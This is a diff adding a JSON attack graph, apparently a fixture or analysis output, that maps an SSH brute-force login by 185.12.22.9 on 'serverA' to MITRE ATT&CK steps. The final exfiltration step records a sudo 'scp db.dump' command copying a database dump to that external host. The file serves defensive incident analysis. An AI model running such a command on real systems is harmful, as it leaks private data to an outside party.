@@ -1,0 +1,58 @@
+{
+  "nodes": [
+    {
+      "id": "185.12.22.9",
+      "label": "Actor"
+    },
+    {
+      "id": "serverA",
+      "label": "Asset"
+    },
+    {
+      "id": "local",
+      "label": "Actor"
+    },
+    {
+      "id": "server",
+      "label": "Asset"
+    }
+  ],
+  "edges": [
+    {
+      "source": "185.12.22.9",
+      "target": "serverA",
+      "stepNum": 1,
+      "tactic": "Credential Access",
+      "technique": "T1110",
+      "time": "2025-08-27T10:15:21Z",
+      "description": "Failed SSH password for user admin"
+    },
+    {
+      "source": "185.12.22.9",
+      "target": "serverA",
+      "stepNum": 2,
+      "tactic": "Credential Access",
+      "technique": "T1110",
+      "time": "2025-08-27T10:15:33Z",
+      "description": "Failed SSH password for user admin"
+    },
+    {
+      "source": "185.12.22.9",
+      "target": "serverA",
+      "stepNum": 3,
+      "tactic": "Credential Access",
+      "technique": "T1078",
+      "time": "2025-08-27T10:15:55Z",
+      "description": "Accepted SSH password for user admin"
+    },
+    {
+      "source": "local",
+      "target": "server",
+      "stepNum": 4,
+      "tactic": "Exfiltration",
+      "technique": "T1041",
+      "time": "2025-08-27T10:16:14Z",
+      "description": "SUDO command executed: /usr/bin/scp db.dump 185.12.22.9:/tmp/"
+    }
+  ]
+}
